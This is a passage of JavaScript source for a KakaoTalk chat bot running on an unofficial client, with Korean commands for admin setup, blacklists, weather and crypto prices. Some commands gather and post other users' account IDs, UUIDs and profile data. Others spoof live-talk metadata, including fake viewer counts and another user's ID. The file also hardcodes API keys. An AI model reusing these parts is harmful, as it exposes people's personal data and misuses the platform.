                                .text("콘솔에 뜬 6자리 인증코드를 사용해 등록 명령어를 써주세요!")
                                .build($KnownChatType.REPLY)
                        );
                        key = Math.random().toString(10).slice(2, 8)
                        key = key + '';
                        iskeyIssued = true;
                        console.log("VERIFICATION CODE: " + key);
                    };
                };

                if (data.text.startsWith(prefix + "등록")) { // + key && iskeyIssued
                    if (!(adminList.includes(id + ''))) {
                        if (iskeyIssued == false) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("등록 명령어를 사용하기 전에 \" 관리자인증 \" 명령어를 써주세요!")
                                    .build($KnownChatType.REPLY)
                            );
                        } else {
                            if (data.text == prefix + "등록") {
                                channel.sendChat(
                                    new $ChatBuilder()
                                        .append(new $ReplyContent(data.chat))
                                        .text("인증 코드를 적어주세요!")
                                        .build($KnownChatType.REPLY)
                                );
                            } else {
                                var usedKey = data.text.split(' ')[1];
                                if (usedKey == key) {
                                    var saveId = "\n" + id + "";
                                    fs.readFile('./bot/adminlist.txt', 'utf8', function (err, data) {
                                        fs.writeFile('./bot/adminlist.txt', data + saveId, 'utf8', function (error) { console.log('write end') });
                                    });
                                    channel.sendChat(
                                        new $ChatBuilder()
                                            .append(new $ReplyContent(data.chat))
                                            .text("관리자 인증에 성공했습니다!\n≫KAKAOTALK LOCO CLIENT V" + ver + "\n≫Made by NEFEW, Modded by williameom")
                                            .build($KnownChatType.REPLY)
                                    );
                                    key = null;
                                    iskeyIssued = false;
                                    console.log("NEW ADMIN VERIFICATION: " + (id));
                                    importAdmin();
                                } else {
                                    key = null;
                                    iskeyIssued = false;
                                    channel.sendChat(
                                        new $ChatBuilder()
                                            .append(new $ReplyContent(data.chat))
                                            .text("잘못된 키입니다! 관리자 인증 명령어를 다시 써주세요!")
                                            .build($KnownChatType.REPLY)
                                    );
                                };
                            };
                        };
                    } else {
                        channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                .text("이미 관리자에 등록이 되어있습니다!")
                                .build($KnownChatType.REPLY)
                        );
                    };
                };

                if (data.text == prefix + "오류") {
                    channel.sendChat(outError);
                };

                if (data.text == prefix + "명령어") {
                    //sendDef(channel);
                    channel.sendChat("[명령어 : 전체기능]\n" + "\u200b".repeat(500) + commands);
                };

                if (data.text == prefix + "패치노트" || data.text == prefix + "패치" || data.text == prefix + "패치목록" || data.text == prefix + "패치내용") {
                    sendPatch(channel);
                };

                if (data.text.startsWith(prefix + "전체보기")) {
                    try {
                        if (data.text.startsWith(prefix + "전체보기 ")) {
                            channel.sendChat(data.text.replace(prefix + "전체보기 ", "") + "\u200b".repeat(500));
                        } else {
                            channel.sendChat("전체보기의 글을 적어주세요!");
                        };
                    } catch (error) {
                        outError = error + "$%^%$";
                        outError = outError.replace("$%^%$", "");
                        channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                    };
                };

                if (data.text == "_카링") {
                    (async () => {
                        const { ApiClient, KakaoLinkClient } = require('node-kakaolink');
                        const Kakao = new KakaoLinkClient();

                        const api = await ApiClient.create('34a9d23406aa4fcd1fe3a076be405668', 'https://williameom.xyz/');
                        const loginRes = await api.login({
                            email: ACC_EMAIL,
                            password: ACC_PASSWORD,
                            keeplogin: true
                        });

                        if (!loginRes.success) throw new Error(`Login Failed with status: ${loginRes.status} and message: ${loginRes.message}`);
                        console.log('[+] Kakao Link Auth Login Success!');

                        Kakao.login(loginRes.result);

                        const send = await Kakao.sendLink(channel.getDisplayName(), {
                            link_ver: '4.0',
                            template_id: 71674,
                            template_args: {
                                title: 'node-kakaolink',
                                desc: 'sendLink from nodeJS'
                            }
                        }, 'custom')

                        console.log(`success: ${send.success} status: ${send.status}`);
                    })();
                };

                if (data.text == prefix + "작동") {
                    channel.sendChat("작동중");
                };

                if (data.text.startsWith(prefix + "블랙")) {
                    if (adminList.includes(id + '')) {
                        if (data.text.startsWith(prefix + "블랙 ")) {
                            var blackId = data.text.replace(prefix + "블랙 ", "");
                            blackList.push(blackId);
                            channel.sendChat("아이디 '" + blackId + "' 가 차단되었습니다!");
                        } else {
                            if (!data.text.includes("블랙해제")) {
                                channel.sendChat("올바른 사용법:\n" + prefix + "블랙 [아이디]");
                            };
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "블랙해제")) {
                    if (adminList.includes(id + '')) {
                        if (data.text.startsWith(prefix + "블랙해제 ")) {
                            var blackId = data.text.replace(prefix + "블랙해제 ", "");
                            var v1 = blackList.indexOf(String(blackId));
                            if (v1 > -1) {
                                blackList.splice(v1, 1);
                                channel.sendChat("해당 유저를 블랙리스트에서 삭제했습니다.");
                            } else {
                                channel.sendChat("블랙리스트에 없는 유저입니다.");
                            };
                        } else {
                            channel.sendChat("올바른 사용법:\n" + prefix + "블랙해제 [아이디]");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "외치기")) {
                    if (adminList.includes(id + '')) {
                        channel.sendChat(
                            new $ChatBuilder().text(data.text.replace(prefix + "외치기", "")).append(new $AttachmentContent({
                                shout: true
                            })).build(1)
                        );
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "tv-on")) {
                    if (adminList.includes(id + '')) {
                        channel.setTvMeta({ url: data.text.substr(prefix.length + 6) });
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "tvlive-on")) {
                    if (adminList.includes(id + '')) {
                        channel.setTvLiveMeta({ url: data.text.substr(prefix.length + 10), live: "on" });
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "tv-off") {
                    if (adminList.includes(id + '')) {
                        channel.setTvLiveMeta({ url: "", live: "off" });
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "tvq")) {
                    var encoded = encodeURI(data.text.replace(prefix + "카카오티비검색 ", ""));
                    channel.sendChat("----------------\nhttps://tv.kakao.com/search?q=" + encoded + "\n----------------");
                };

                if (data.text.startsWith(prefix + "live-on")) {
                    if (adminList.includes(id + '')) {
                        try {
                            async function aa() {
                                var infoObj = {
                                    "liveon": true,
                                    "title": "",
                                    "startTime": 1111111111,
                                    "userId": id, //id
                                    "csIP": "211.231.102.213",
                                    "csIP6": "2404:4600:6:369:211:231:102:213",
                                    "csPort": 9000,
                                    "callId": "1111111111111111"
                                };
                                if (data.mentions[0]) {
                                    infoObj["userId"] = data.mentions[0].user_id;
                                };
                                var myMsg = await channel.setLiveTalkInfoMeta(infoObj);
                                await channel.setLiveTalkCountMeta({
                                    count: 999
                                });
                                if (myMsg.success) {
                                    channel.sendChat("라이브톡 시작 성공");
                                } else {
                                    channel.sendChat("라이브톡 시작 실패");
                                };
                            };
                            aa();
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "live-off") {
                    if (adminList.includes(id + '')) {
                        try {
                            async function aa() {
                                await channel.setLiveTalkCountMeta({
                                    count: 0
                                });
                                var myMsg = await channel.setLiveTalkInfoMeta({
                                    "liveon": false,
                                    "title": "",
                                    "startTime": 1111111111,
                                    "userId": id,
                                    "csIP": "211.231.102.213",
                                    "csIP6": "2404:4600:6:369:211:231:102:213",
                                    "csPort": 9000,
                                    "callId": "1111111111111111"
                                });
                                if (myMsg.success) {
                                    channel.sendChat("라이브톡 종료 성공");
                                } else {
                                    channel.sendChat("라이브톡 종료 실패");
                                };
                            };
                            aa();
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "live-re") {
                    if (adminList.includes(id + '')) {
                        try {
                            async function aa() {
                                await channel.setLiveTalkCountMeta({
                                    count: 0
                                });
                                var myMsg = await channel.setLiveTalkInfoMeta({
                                    "liveon": false,
                                    "title": "",
                                    "startTime": 1111111111,
                                    "userId": id,
                                    "csIP": "211.231.102.213",
                                    "csIP6": "2404:4600:6:369:211:231:102:213",
                                    "csPort": 9000,
                                    "callId": "1111111111111111"
                                });
                                await delay(110);
                                var myMsg2 = await channel.setLiveTalkInfoMeta({
                                    "liveon": true,
                                    "title": "",
                                    "startTime": 1111111111,
                                    "userId": id, //id
                                    "csIP": "211.231.102.213",
                                    "csIP6": "2404:4600:6:369:211:231:102:213",
                                    "csPort": 9000,
                                    "callId": "1111111111111111"
                                });
                                await channel.setLiveTalkCountMeta({
                                    count: 999
                                });
                                if (myMsg.success && myMsg2.success) {
                                    channel.sendChat("라이브톡 재시작 성공");
                                } else {
                                    channel.sendChat("라이브톡 재시작 실패");
                                };
                            };
                            aa();
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "openq")) {
                    var word = data.text.replace(prefix + "openq ", "");
                    var encoded = encodeURI(word);
                    var link = 'https://open.kakao.com/c/search/unified?q=' + encoded + '&s=l&p=1&expectLock=n';
                    request(link, function (err, res, html) {
                        try {
                            var result = JSON.parse(html);
                            if (result.count == 0) {
                                channel.sendChat("검색된 방이 없습니다!\n" + link);
                            } else {
                                var resultText = result.items.map((open) => [
                                    "\n======================\n방 이름: " + open.ln + "\n방 설명: " + open.desc + "\n방장 닉네임: " + open.nn + "\n방 인원: " + open.mcnt + "\n방 배경사진: " + open["1iu"] + "\n방 링크: " + open.lu + "\n======================\n"
                                ]);
                                channel.sendChat("[ 오픈채팅 " + '"' + word + '"' + " 검색 결과 ]\n" + "\u200b".repeat(490) + "\n" + resultText);
                            };
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    });
                };

                if (data.text.startsWith(prefix + "날씨")) {
                    if (data.text.includes(prefix + "날씨 ")) {
                        try {
                            weatherurl = "https://search.naver.com/search.naver?sm=top_hty&fbm=1&ie=utf8&query=" + args[1] + "+날씨";
                            weatherurl = (encodeURI(weatherurl));
                            request(weatherurl, (error, response, html) => {
                                try {
                                    var htmlTrash1 = ' <dt class="term">';
                                    var htmlTrash2 = '</dt> <dd class="desc"';
                                    var htmlTrash3 = '<div class="temperature_info"> <p class="summary">';
                                    var htmlTrash4 = '<span class="temperature down">';
                                    var htmlTrash5 = '<span class="blind">';
                                    var htmlTrash6 = '<span class="celsius">';
                                    var htmlTrash7 = '</p> <dl class="summary_list"> <dt class="term">강수확률</dt> <dd class="desc">';
                                    var htmlTrash8 = ' <dt class="term">습도</dt> <dd class="desc">';
                                    var htmlTrash9 = ' <span class="weather before_slash">';
                                    var weatherData = cheerio.load(html);
                                    var weather_TodayTemp = String(weatherData(".temperature_text")).split("</span>")[1].replace(htmlTrash6, '');
                                    var weather_Sun = String(weatherData(".report_card_wrap")).split('<strong class="title">')[3].split('</span>')[0].split('<span class="txt">')[1];
                                    var weather_SunRise = String(weatherData(".report_card_wrap")).split('<strong class="title">')[4].split('</span>')[0].split('<span class="txt">')[1];
                                    var weather_RainPercent = String(weatherData(".temperature_info")).split('</span>')[3].split('</dd>')[0].replace(htmlTrash7, '');
                                    var weather_AirRainy = String(weatherData(".temperature_info")).split('</span>')[3].split('</dd>')[1].replace(htmlTrash8, '');
                                    var weather_Weather = String(weatherData(".temperature_info")).split('</span>')[3].split('</dd>')[2].replace(htmlTrash1, '').replace(htmlTrash2, '').replace('>', ' ');
                                    var weather_Yesterday = String(weatherData(".temperature_info")).split('</p>')[0].replace(htmlTrash3, '').replace(htmlTrash4, '').replace(htmlTrash5, '').split('</span>')[0];
                                    var weather_HowWeather = String(weatherData(".temperature_info")).split('</span>')[2].replace(htmlTrash9, '');
                                    var mise = weatherData(".num")[5].children[0].data.split('㎍/㎥');
                                    var chomise = weatherData(".num")[6].children[0].data.split('㎍/㎥');
                                    var ojon = weatherData(".num")[7].children[0].data.split('ppm');
                                    var status1;
                                    var status2;
                                    var status3;
                                    if (chomise[0] == 'null') {
                                        chomise = '데이터 없음';
                                        status2 = '';
                                    };
                                    if (mise[0] <= 30) {
                                        status1 = '좋음';
                                    } else if (mise[0] > 30 && mise[0] <= 80) {
                                        status1 = '보통';
                                    } else if (mise[0] > 80 && mise[0] <= 150) {
                                        status1 = '나쁨';
                                    } else if (mise[0] > 150) {
                                        status2 = '매우 나쁨';
                                    };
                                    if (chomise[0] <= 30) {
                                        status2 = '좋음';
                                    } else if (chomise[0] > 30 && mise[0] <= 80) {
                                        status2 = '보통';
                                    } else if (chomise[0] > 80 && mise[0] <= 150) {
                                        status2 = '나쁨';
                                    } else if (chomise[0] > 150) {
                                        status2 = '매우 나쁨';
                                    };
                                    if (ojon[0] <= 0.03) {
                                        status3 = '좋음';
                                    } else if (ojon[0] > 0.03 && ojon[0] <= 0.09) {
                                        status3 = '보통';
                                    } else if (ojon[0] > 0.09 && ojon[0] <= 0.15) {
                                        status3 = '나쁨';
                                    } else if (ojon[0] >= 0.151) {
                                        status3 = '매우나쁨';
                                    };
                                    channel.sendChat(args[1] + "의 날씨:" + "\n- 날씨: " + weather_Weather + "\n- ㄴ" + weather_HowWeather + "\n- ㄴ" + weather_Yesterday.replace("<span class=\"temperature up\">", "") + "\n- 현재 기온: " + weather_TodayTemp + "\n- 자외선: " + weather_Sun + "\n- 일몰: " + weather_SunRise + "\n- 강수확률: " + weather_RainPercent + "\n- 습도: " + weather_AirRainy + "\n- 미세먼지: " + mise[0] + "㎍/㎥ | " + status1 + "\n- 초미세먼지: " + chomise[0] + "㎍/㎥ | " + status2 + "\n- 오존지수: " + ojon[0] + "ppm | " + status3);
                                } catch (error) {
                                    outError = error + "$%^%$";
                                    outError = outError.replace("$%^%$", "");
                                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                                };
                            });
                        } catch (error) {
                            channel.sendChat("오류 발생!\n" + error);
                        };
                    } else {
                        channel.sendChat("날씨를 불러올 국가/지역을 적어주세요!");
                    };
                };

                if (data.text == prefix + "한강") {
                    try {
                        request('http://hangang.dkserver.wo.tc', (error, response, html) => {
                            const river = JSON.parse(html);
                            channel.sendChat("현재 한강 온도는 " + river.temp + "°C 입니다!\n측정시각: " + river.time);
                        });
                    } catch (error) {
                        outError = error + "$%^%$";
                        outError = outError.replace("$%^%$", "");
                        channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                    };
                };

                if (data.text.startsWith(prefix + "암호화폐")) {
                    if (data.text == prefix + "암호화폐") {
                        try {
                            try {
                                request('https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,EOS,XRP&tsyms=KRW&api_key=6c252aa53f14b1d0baa78cca2487eb9188763eb80b4a192354a22739e6bba729', (error, response, html) => {
                                    bit = JSON.parse(html);
                                    channel.sendChat("암호화폐 시세 (KRW:한국:원)\n- BTC: " + bit.BTC.KRW + " \\\n- ETH: " + bit.ETH.KRW + " \\\n- EOS: " + bit.EOS.KRW + " \\\n- XRP: " + bit.XRP.KRW + " \\\n'" + prefix + "암호화폐 KRW/USD/EUR/CNY' 로 시세확인 가능");
                                });
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    } else if (data.text == prefix + "암호화폐 KRW") {
                        try {
                            try {
                                request('https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,EOS,XRP&tsyms=KRW&api_key=6c252aa53f14b1d0baa78cca2487eb9188763eb80b4a192354a22739e6bba729', (error, response, html) => {
                                    bit = JSON.parse(html);
                                    channel.sendChat("암호화폐 시세 (KRW:한국:원)\n- BTC: " + bit.BTC.KRW + " \\\n- ETH: " + bit.ETH.KRW + " \\\n- EOS: " + bit.EOS.KRW + " \\\n- XRP: " + bit.XRP.KRW + " \\\n'" + prefix + "암호화폐 KRW/USD/EUR/CNY' 로 시세확인 가능");
                                });
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    } else if (data.text == prefix + "암호화폐 USD") {
                        try {
                            try {
                                request('https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,EOS,XRP&tsyms=USD&api_key=6c252aa53f14b1d0baa78cca2487eb9188763eb80b4a192354a22739e6bba729', (error, response, html) => {
                                    bit = JSON.parse(html);
                                    channel.sendChat("암호화폐 시세 (USD:미국:달러)\n- BTC: " + bit.BTC.USD + " $\n- ETH: " + bit.ETH.USD + " $\n- EOS: " + bit.EOS.USD + " $\n- XRP: " + bit.XRP.USD + " $\n'" + prefix + "암호화폐 KRW/USD/EUR/CNY' 로 시세확인 가능");
                                });
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    } else if (data.text == prefix + "암호화폐 EUR") {
                        try {
                            try {
                                request('https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,EOS,XRP&tsyms=EUR&api_key=6c252aa53f14b1d0baa78cca2487eb9188763eb80b4a192354a22739e6bba729', (error, response, html) => {
                                    bit = JSON.parse(html);
                                    channel.sendChat("암호화폐 시세 (EUR:프랑스:유로)\n- BTC: " + bit.BTC.EUR + " €\n- ETH: " + bit.ETH.EUR + " €\n- EOS: " + bit.EOS.EUR + " €\n- XRP: " + bit.XRP.EUR + " €\n'" + prefix + "암호화폐 KRW/USD/EUR/CNY' 로 시세확인 가능");
                                });
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    } else if (data.text == prefix + "암호화폐 CNY") {
                        try {
                            try {
                                request('https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,EOS,XRP&tsyms=CNY&api_key=6c252aa53f14b1d0baa78cca2487eb9188763eb80b4a192354a22739e6bba729', (error, response, html) => {
                                    bit = JSON.parse(html);
                                    channel.sendChat("암호화폐 시세 (CNY:중국:위안)\n- BTC: " + bit.BTC.CNY + " ¥\n- ETH: " + bit.ETH.CNY + " ¥\n- EOS: " + bit.EOS.CNY + " ¥\n- XRP: " + bit.XRP.CNY + " ¥\n'" + prefix + "암호화폐 KRW/USD/EUR/CNY' 로 시세확인 가능");
                                });
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    };
                };

                if (data.text.startsWith(prefix + "아이디검색")) {

                };

                if (data.text.startsWith(prefix + "톡디검색")) {

                };

                if (data.text.startsWith(prefix + "정보")) {
                    if (data.text.includes(prefix + "정보 ") && data.mentions[0]) {
                        try {
                            var getId = data.mentions[0].user_id;
                            var oUser = channel.getUserInfo({ userId: getId });
                            console.log(oUser);
                            var country = oUser.countryIso;
                            let searchId = new node_kakao.api.ServiceApiClient(SessionWebClient);
                            searchId.findFriendById(getId).then((res) => {
                                if (res.success == false) {
                                    var accId = oUser.accountId;
                                    var username = oUser.nickname;
                                    var status = oUser.statusMessage;
                                    var profile = oUser.profileURL;
                                    var profile2 = oUser.fullProfileURL;
                                    var profile3 = oUser.originalProfileURL;
                                    var service = oUser.linkedServices;
                                    let searchId = new node_kakao.api.ServiceApiClient(SessionWebClient);
                                    searchId.findFriendById(getId).then((res) => {
                                        sendLong(channel, "[ 유저 정보 ]\n" + getId, "<<<<<<<<<<<<유저정보>>>>>>>>>>>>" +
                                            "\n\n" +
                                            "프로필 아이디: " + getId +
                                            "\n\n" +
                                            "계정 아이디: " + accId +
                                            "\n\n" +
                                            "닉네임: " + username +
                                            "\n\n" +
                                            "상태메세지: " + status +
                                            "\n\n" +
                                            "국가: " + country +
                                            "\n\n" +
                                            "프로필사진 (1): " + profile +
                                            "\n\n" +
                                            "프로필사진 (2): " + profile2 +
                                            "\n\n" +
                                            "프로필사진 (3): " + profile3 +
                                            "\n\n" +
                                            "이용중인 서비스: " + service +
                                            "\n\n" +
                                            "SEARCH: " + JSON.stringify(res, null, 2) +
                                            "");
                                        (async () => {
                                            await delay(330);
                                            getProfile(channel, getId);
                                        })();
                                    });
                                    return;
                                };
                                var user = res.result.friend;
                                var accId = user.accountId;
                                var kakaoId = user.UUID;
                                var username = user.nickName;
                                var status = user.statusMessage;
                                var profile = user.profileImageUrl;
                                var profile2 = user.fullProfileImageUrl;
                                var profile3 = user.originalProfileImageUrl;
                                var service = oUser.linkedServices;
                                sendLong(channel, "[ 유저 정보 ]\n" + getId, "<<<<<<<<<<<<유저정보>>>>>>>>>>>>" +
                                    "\n\n" +
                                    "프로필 아이디: " + getId +
                                    "\n\n" +
                                    "계정 아이디: " + accId +
                                    "\n\n" +
                                    "카카오톡 아이디: " + kakaoId +
                                    "\n\n" +
                                    "닉네임: " + username +
                                    "\n\n" +
                                    "상태메세지: " + status +
                                    "\n\n" +
                                    "국가: " + country +
                                    "\n\n" +
                                    "프로필사진 (1): " + profile +
                                    "\n\n" +
                                    "프로필사진 (2): " + profile2 +
                                    "\n\n" +
                                    "프로필사진 (3): " + profile3 +
                                    "\n\n" +
                                    "이용중인 서비스: " + service +
                                    "\n\n" +
                                    "SEARCH: " + JSON.stringify(res, null, 2) +
                                    "");
                                (async () => {
                                    await delay(330);
                                    getProfile(channel, getId);
                                })();
                            });
                        } catch (e) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("작업 과정에서 오류가 발생했습니다.\b" + e)
                                    .build($KnownChatType.REPLY)
                            );
                        };
                    } else if (data.originalType == "26") {
                        try {
                            var getId = data._chat.attachment.src_userId;
                            var oUser = channel.getUserInfo({ userId: getId });
                            var country = oUser.countryIso;
                            let searchId = new node_kakao.api.ServiceApiClient(SessionWebClient);
                            searchId.findFriendById(getId).then((res) => {
                                if (res.success == false) {
                                    var accId = oUser.accountId;
                                    var username = oUser.nickname;
                                    var status = oUser.statusMessage;
                                    var profile = oUser.profileURL;
                                    var profile2 = oUser.fullProfileURL;
                                    var profile3 = oUser.originalProfileURL;
                                    var service = oUser.linkedServices
                                    let searchId = new node_kakao.api.ServiceApiClient(SessionWebClient);
                                    searchId.findFriendById(getId).then((res) => {
                                        sendLong(channel, "[ 유저 정보 ]\n" + getId, "<<<<<<<<<<<<유저정보>>>>>>>>>>>>" +
                                            "\n\n" +
                                            "프로필 아이디: " + getId +
                                            "\n\n" +
                                            "계정 아이디: " + accId +
                                            "\n\n" +
                                            "닉네임: " + username +
                                            "\n\n" +
                                            "상태메세지: " + status +
                                            "\n\n" +
                                            "국가: " + country +
                                            "\n\n" +
                                            "프로필사진 (1): " + profile +
                                            "\n\n" +
                                            "프로필사진 (2): " + profile2 +
                                            "\n\n" +
                                            "프로필사진 (3): " + profile3 +
                                            "\n\n" +
                                            "이용중인 서비스: " + service +
                                            "\n\n" +
                                            "SEARCH: " + JSON.stringify(res, null, 2) +
                                            "");
                                    });
                                    (async () => {
                                        await delay(330);
                                        getProfile(channel, getId);
                                    })();
                                    return;
                                };
                                var user = res.result.friend;
                                var accId = user.accountId;
                                var kakaoId = user.UUID;
                                var username = user.nickName;
                                var status = user.statusMessage;
                                var profile = user.profileImageUrl;
                                var profile2 = user.fullProfileImageUrl;
                                var profile3 = user.originalProfileImageUrl;
                                var service = oUser.linkedServices;
                                sendLong(channel, "[ 유저 정보 ]\n" + getId, "<<<<<<<<<<<<유저정보>>>>>>>>>>>>" +
                                    "\n\n" +
                                    "프로필 아이디: " + getId +
                                    "\n\n" +
                                    "계정 아이디: " + accId +
                                    "\n\n" +
                                    "카카오톡 아이디: " + kakaoId +
                                    "\n\n" +
                                    "닉네임: " + username +
                                    "\n\n" +
                                    "상태메세지: " + status +
                                    "\n\n" +
                                    "국가: " + country +
                                    "\n\n" +
                                    "프로필사진 (1): " + profile +
                                    "\n\n" +
                                    "프로필사진 (2): " + profile2 +
                                    "\n\n" +
                                    "프로필사진 (3): " + profile3 +
                                    "\n\n" +
                                    "이용중인 서비스: " + service +
                                    "\n\n" +
                                    "SEARCH: " + JSON.stringify(res, null, 2) +
                                    "");
                                (async () => {
                                    await delay(330);
                                    getProfile(channel, getId);
                                })();
                            });
                        } catch (e) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("작업 과정에서 오류가 발생했습니다.\b" + e)
                                    .build($KnownChatType.REPLY)
                            );
                        };
                    } else if (data.text.startsWith(prefix + "정보 ")) {
                        try {
                            var getId = data.text.split(" ")[1];
                            if (isNaN(getId)) {
                                let searchId = new node_kakao.api.ServiceApiClient(SessionWebClient);
                                searchId.findFriendByUUID(getId).then((res) => {
                                    if (res.success == false) {
                                        channel.sendChat(
                                            new $ChatBuilder()
                                                .append(new $ReplyContent(data.chat))
                                                .text("해당 유저의 정보는 가져올수 없습니다! [1] 오류: " + res.result.status)
                                                .build($KnownChatType.REPLY)
                                        );
                                        return;
                                    };
                                    var user = res.result.member;
                                    var accId = user.accountId;
                                    var kakaoId = user.UUID;
                                    var username = user.nickName;
                                    var status = user.statusMessage;
                                    var profile = user.profileImageUrl;
                                    var profile2 = user.fullProfileImageUrl;
                                    var profile3 = user.originalProfileImageUrl;
                                    var service = user.linkedServices;
                                    sendLong(channel, "[ 유저 정보 ]\n" + getId, "<<<<<<<<<<<<유저정보>>>>>>>>>>>>" +
                                        "\n\n" +
                                        "프로필 아이디: " + getId +
                                        "\n\n" +
                                        "계정 아이디: " + accId +
                                        "\n\n" +
                                        "카카오톡 아이디: " + kakaoId +
                                        "\n\n" +
                                        "닉네임: " + username +
                                        "\n\n" +
                                        "상태메세지: " + status +
                                        "\n\n" +
                                        "프로필사진 (1): " + profile +
                                        "\n\n" +
                                        "프로필사진 (2): " + profile2 +
                                        "\n\n" +
                                        "프로필사진 (3): " + profile3 +
                                        "\n\n" +
                                        "이용중인 서비스: " + service +
                                        "\n\n" +
                                        "SEARCH: " + JSON.stringify(res, null, 2) +
                                        "");
                                    (async () => {
                                        await delay(110);
                                        getProfile(channel, getId);
                                    })();
                                });
                            } else {
                                let searchId = new node_kakao.api.ServiceApiClient(SessionWebClient);
                                searchId.findFriendById(getId).then((res) => {
                                    if (res.success == false) {
                                        channel.sendChat(
                                            new $ChatBuilder()
                                                .append(new $ReplyContent(data.chat))
                                                .text("해당 유저의 정보는 가져올수 없습니다! [2] 오류: " + res.result.status)
                                                .build($KnownChatType.REPLY)
                                        );
                                        return;
                                    };
                                    var user = res.result.friend;
                                    var accId = user.accountId;
                                    var kakaoId = user.UUID;
                                    var username = user.nickName;
                                    var status = user.statusMessage;
                                    var profile = user.profileImageUrl;
                                    var profile2 = user.fullProfileImageUrl;
                                    var profile3 = user.originalProfileImageUrl;
                                    var service = user.linkedServices;
                                    sendLong(channel, "[ 유저 정보 ]\n" + getId, "<<<<<<<<<<<<유저정보>>>>>>>>>>>>" +
                                        "\n\n" +
                                        "프로필 아이디: " + getId +
                                        "\n\n" +
                                        "계정 아이디: " + accId +
                                        "\n\n" +
                                        "카카오톡 아이디: " + kakaoId +
                                        "\n\n" +
                                        "닉네임: " + username +
                                        "\n\n" +
                                        "상태메세지: " + status +
                                        "\n\n" +
                                        "프로필사진 (1): " + profile +
                                        "\n\n" +
                                        "프로필사진 (2): " + profile2 +
                                        "\n\n" +
                                        "프로필사진 (3): " + profile3 +
                                        "\n\n" +
                                        "이용중인 서비스: " + service +
                                        "\n\n" +
                                        "SEARCH: " + JSON.stringify(res, null, 2) +
                                        "");
                                    (async () => {
                                        await delay(110);
                                        getProfile(channel, getId);
                                    })();
                                });
                            };
                        } catch (e) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
